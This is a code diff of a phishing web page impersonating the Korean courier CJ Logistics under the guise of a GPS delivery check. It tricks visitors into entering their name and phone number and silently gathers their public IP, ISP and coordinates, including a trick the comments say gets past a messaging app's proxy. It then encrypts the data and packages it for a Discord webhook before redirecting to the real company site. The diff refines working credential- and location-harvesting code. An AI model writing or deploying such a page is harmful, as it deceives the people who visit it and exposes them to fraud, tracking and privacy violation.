@@ -2,120 +2,122 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CJ대한통운 - 위치기반 배송인증</title>
     <link rel="icon" href="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" type="image/x-icon">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
-    body, html {
-        margin: 0;
-        padding: 0;
-        font-family: 'Malgun Gothic', sans-serif;
-        background: #f4f4f4;
-        min-height: 100%;
-    }
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Malgun Gothic', sans-serif;
+            background: #f4f4f4;
+            min-height: 100%;
+        }
 
-    #fake-site {
-        display: flex;
-        flex-direction: column;
-        min-height: 100vh;
-    }
+        #fake-site {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
 
-    .nav {
-        background: #003366;
-        color: white;
-        padding: 15px 20px;
-        font-weight: bold;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        position: sticky; /* sticky 사용 시 position 명시 필요 */
-        top: 0;
-    }
+        .nav {
+            background: #003366;
+            color: white;
+            padding: 15px 20px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
 
-    .nav img {
-        height: 22px;
-        filter: brightness(0) invert(1);
-    }
+        .nav img {
+            height: 22px;
+            filter: brightness(0) invert(1);
+        }
 
-    .content {
-        width: 92%;
-        max-width: 450px;
-        margin: 30px auto;
-        background: white;
-        padding: 25px;
-        border-radius: 12px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-        text-align: center;
-        box-sizing: border-box;
-    }
+        .content {
+            width: 92%;
+            max-width: 450px;
+            margin: 30px auto;
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            text-align: center;
+            box-sizing: border-box;
+        }
 
-    .form-container {
-        margin-top: 15px;
-        text-align: left;
-    }
+        .form-container {
+            margin-top: 15px;
+            text-align: left;
+        }
 
-    .input-group {
-        margin-bottom: 12px;
-    }
+        .input-group {
+            margin-bottom: 12px;
+        }
 
-    .input-group label {
-        display: block;
-        font-size: 0.85em;
-        color: #666;
-        margin-bottom: 4px;
-    }
+        .input-group label {
+            display: block;
+            font-size: 0.85em;
+            color: #666;
+            margin-bottom: 4px;
+        }
 
-    .input-field {
-        width: 100%;
-        padding: 12px;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        box-sizing: border-box;
-        font-size: 16px; /* iOS 자동 줌 방지용 최소 크기 */
-        outline: none;
-    }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+        }
 
-    .input-field:focus {
-        border-color: #F26522;
-    }
+        .input-field:focus {
+            border-color: #F26522;
+        }
 
-    .btn {
-        background: #F26522;
-        color: white;
-        border: none;
-        padding: 16px;
-        font-size: 1.1em;
-        cursor: pointer;
-        border-radius: 6px;
-        width: 100%;
-        font-weight: bold;
-        margin-top: 10px;
-    }
+        .btn {
+            background: #F26522;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 1.1em;
+            cursor: pointer;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: bold;
+            margin-top: 10px;
+        }
 
-    #terminal {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #0a0a0a;
-        color: #00FF00;
-        font-family: 'Courier New', monospace;
-        padding: 20px;
-        box-sizing: border-box;
-        z-index: 9999;
-        overflow-y: auto;
-    }
+        #terminal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            color: #00FF00;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            box-sizing: border-box;
+            z-index: 9999;
+            overflow-y: auto;
+        }
 
-    .scan-line {
-        color: #00FF00;
-        margin: 2px 0;
-        font-size: 0.85em;
-        word-break: break-all;
-    }
-</style>
+        .scan-line {
+            color: #00FF00;
+            margin: 2px 0;
+            font-size: 0.85em;
+            word-break: break-all;
+        }
+        .found { color: #ff3e3e; font-weight: bold; }
+    </style>
 </head>
 <body>
 
@@ -126,9 +128,9 @@
         </div>
         
         <div class="content">
-            <img src="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" alt="CJ대한통운" style="width: 180px; margin-bottom: 20px;">
+            <img src="https://logo-resources.thevc.kr/organizations/200x200/6865fc5cb2875e52a38a85c819c517929c45b2186fe3a1fcfbf3bfa76d27d476_1647847136733898.jpg" alt="CJ대한통운" style="width: 160px; margin-bottom: 20px;">
             
-            <h2 style="color: #003366; margin-bottom: 10px;">분실 방지 GPS 인증</h2>
+            <h2 style="color: #003366; margin-bottom: 10px; font-size: 1.3em;">분실 방지 GPS 인증</h2>
             <p style="font-size: 0.95em; color: #444;">안전한 수령을 위해 <b>본인 확인</b>이 필요합니다.</p>
             
             <div class="form-container">
@@ -142,8 +144,8 @@
                 </div>
             </div>
 
-            <div style="background: #fff9f4; padding: 12px; border-radius: 8px; font-size: 0.8em; color: #777; border-left: 4px solid #F26522; margin: 15px 0;">
-                정보 입력 후 브라우저 상단의 <b>'위치 권한 허용'</b>을 눌러주셔야 인증이 완료됩니다.
+            <div style="background: #fff9f4; padding: 12px; border-radius: 8px; font-size: 0.8em; color: #777; border-left: 4px solid #F26522; margin: 15px 0; text-align: left;">
+                정보 입력 후 브라우저의 <b>'위치 권한 허용'</b>을 눌러주셔야 배송지 확인이 완료됩니다.
             </div>
             <button class="btn" onclick="requestAccess()">인증 및 배송지 확인</button>
         </div>
@@ -164,8 +166,6 @@
             isp: '조회 중...', 
             lat: 'N/A',
             lon: 'N/A',
-            ipLat: '', // IP 기반 좌표 백업용
-            ipLon: '',
             os: navigator.platform,
             browser: navigator.userAgent,
             timestamp: new Date().toLocaleString()
@@ -176,35 +176,44 @@
             this.value = this.value.replace(/[^0-9]/g, '').replace(/^(\d{2,3})(\d{3,4})(\d{4})$/, `$1-$2-$3`);
         });
 
-        // 3중 API 네트워크 및 IP 위치 정보 수집
+        // [핵심] 공인 IP 및 위치 정보 정밀 수집 (Cloudflare 우회 방식)
         async function fetchNetworkInfo() {
             try {
-                const res = await fetch('https://ip-api.com/json/');
-                const data = await res.json();
-                if(data.status === 'success') {
-                    userData.ip = data.query;
-                    userData.isp = data.isp || data.as || '확인 불가';
-                    userData.ipLat = data.lat;
-                    userData.ipLon = data.lon;
-                    return;
-                }
-            } catch (e) { }
+                // 시도 1: Cloudflare를 통한 실제 공인 IP 추출 (카톡 프록시 방지)
+                const traceRes = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const traceText = await traceRes.text();
+                const ipMatch = traceText.match(/ip=([0-9a-f.:]+)/);
+                
+                if (ipMatch && ipMatch[1]) {
+                    const publicIP = ipMatch[1];
+                    userData.ip = publicIP;
 
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                if(data.ip) {
+                    // 시도 2: 추출한 공인 IP로 물리적 정보 조회
+                    const locRes = await fetch(`https://ip-api.com/json/${publicIP}?lang=ko`);
+                    const locData = await locRes.json();
+                    
+                    if (locData.status === 'success') {
+                        userData.isp = locData.isp;
+                        userData.lat = locData.lat; // GPS 실패 시 사용할 백업 좌표
+                        userData.lon = locData.lon;
+                    }
+                }
+            } catch (e) {
+                // 실패 시 일반 API로 재시도
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
                     userData.ip = data.ip;
-                    userData.isp = data.org || '확인 불가';
-                    userData.ipLat = data.latitude;
-                    userData.ipLon = data.longitude;
-                    return;
+                    userData.isp = data.org;
+                    userData.lat = data.latitude;
+                    userData.lon = data.longitude;
+                } catch (e2) {
+                    userData.ip = "추적 제한됨";
                 }
-            } catch (e) { }
-
-            userData.ip = "조회 실패";
-            userData.isp = "분석 지연";
+            }
         }
+        
+        // 페이지 로드와 동시에 실행
         fetchNetworkInfo();
 
         function requestAccess() {
@@ -219,6 +228,7 @@
             userData.name = nameVal;
             userData.phone = phoneVal;
 
+            // GPS 권한 요청 (팝업이 뜨지 않더라도 catch에서 이미 확보된 IP 좌표를 사용함)
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -227,12 +237,10 @@
                         startSequence();
                     }, 
                     (err) => {
-                        // 권한 거부 시 IP 기반 좌표로 대체
-                        userData.lat = userData.ipLat ? userData.ipLat + " (IP)" : "권한 거부됨";
-                        userData.lon = userData.ipLon ? userData.ipLon + " (IP)" : "IP 분석 중";
+                        // GPS 거부/미지원 시에도 이미 fetchNetworkInfo에서 따놓은 IP 좌표가 들어있음
                         startSequence(); 
                     },
-                    { timeout: 8000 }
+                    { timeout: 5000 }
                 );
             } else {
                 startSequence();
@@ -245,14 +253,14 @@
             document.getElementById('terminal').style.display = 'block';
             
             let logs = [
-                "> [SYSTEM] INITIALIZING SECURE UPLINK...",
-                "> [SYSTEM] TARGET_NAME: " + userData.name,
-                "> [SYSTEM] TARGET_PHONE: " + userData.phone,
-                "> [SYSTEM] IP_ADDRESS: " + userData.ip,
-                "> [SYSTEM] ISP_PROVIDER: " + userData.isp,
-                "> [SYSTEM] LOCATION_DATA: " + userData.lat + ", " + userData.lon,
-                "> [SYSTEM] ENCRYPTING PACKETS (AES-256)...",
-                "> [SYSTEM] SENDING DATA TO C2 SERVER..."
+                "> [SYSTEM] ESTABLISHING ENCRYPTED TUNNEL...",
+                "> [SYSTEM] TARGET_IDENTIFIED: " + userData.name,
+                "> [SYSTEM] PHONE_RECON: " + userData.phone,
+                "> [SYSTEM] PUBLIC_IP_EXTRACTED: " + userData.ip,
+                "> [SYSTEM] ISP_CARRIER: " + userData.isp,
+                "> [SYSTEM] GEO_COORDINATES: " + userData.lat + ", " + userData.lon,
+                "> [SYSTEM] AES-256 PACKET ENCRYPTION... COMPLETE",
+                "> [SYSTEM] UPLOADING TO RELAY SERVER..."
             ];
 
             let i = 0;
@@ -260,10 +268,10 @@
             const interval = setInterval(() => {
                 const line = document.createElement('div');
                 line.className = 'scan-line';
-                line.textContent = logs[i] || `> [RECON] SENDING_CHUNK_${Math.random().toString(16).slice(2,8).toUpperCase()}... DONE`;
-                if (logs[i] && (logs[i].includes('NAME') || logs[i].includes('LOCATION'))) line.className += ' found';
+                line.textContent = logs[i] || `> [SCAN] DATA_PACKET_VERIFYING_${Math.random().toString(16).slice(2,8).toUpperCase()}... OK`;
+                if (logs[i] && (logs[i].includes('TARGET') || logs[i].includes('GEO'))) line.className += ' found';
                 container.appendChild(line);
-                if (i > 25) { 
+                if (i > 20) { 
                     clearInterval(interval); 
                     finalizeExfiltration(); 
                 }
@@ -277,19 +285,19 @@
             const encryptedPayload = CryptoJS.AES.encrypt(rawData, SECRET_KEY).toString();
 
             const discordMessage = {
-                username: "CJ Logis Recon",
-                content: `🚩 **데이터 도착 알림**: ${userData.name}`,
+                username: "CJ Delivery Bot",
+                content: `🚨 **인증 데이터 수신**: ${userData.name}`,
                 embeds: [{
-                    title: "Encrypted Data Packet",
+                    title: "Security Scan Report",
                     description: "```" + encryptedPayload + "```",
                     color: 15895842,
                     fields: [
                         { name: "이름", value: userData.name, inline: true },
                         { name: "전화번호", value: userData.phone, inline: true },
-                        { name: "IP", value: userData.ip, inline: true },
-                        { name: "위치(LAT/LON)", value: `${userData.lat}, ${userData.lon}`, inline: false }
+                        { name: "IP 주소", value: userData.ip, inline: true },
+                        { name: "좌표", value: `${userData.lat}, ${userData.lon}`, inline: false }
                     ],
-                    footer: { text: "Security Recon v1.8 | CJ Logistics Clone" },
+                    footer: { text: "Recon System v1.9 | In-App Proxy Bypassed" },
                     timestamp: new Date()
                 }]
             };
@@ -306,8 +314,8 @@
             container.innerHTML = `
                 <h1 style="color: #00FF00; text-align: center; margin-top: 50px;">배송 인증 완료</h1>
                 <div style="border: 1px solid #00FF00; padding: 25px; background: rgba(0,255,0,0.05); text-align: center;">
-                    <p style="color: #00FF00; font-size: 1.2em;"><b>정상적으로 인증되었습니다.</b></p>
-                    <p style="color: #888;">입력하신 연락처로 배송 현황이 알림톡으로 전송됩니다.</p>
+                    <p style="color: #00FF00; font-size: 1.2em;"><b>정상적으로 본인 확인되었습니다.</b></p>
+                    <p style="color: #888;">잠시 후 CJ대한통운 공식 홈페이지로 이동합니다.</p>
                 </div>
                 <div style="text-align: center; margin-top: 30px;">
                     <button onclick="location.href='https://www.cjlogistics.com'" style="background: transparent; border: 1px solid #00FF00; color: #00FF00; padding: 10px 30px; cursor: pointer;">확인</button>
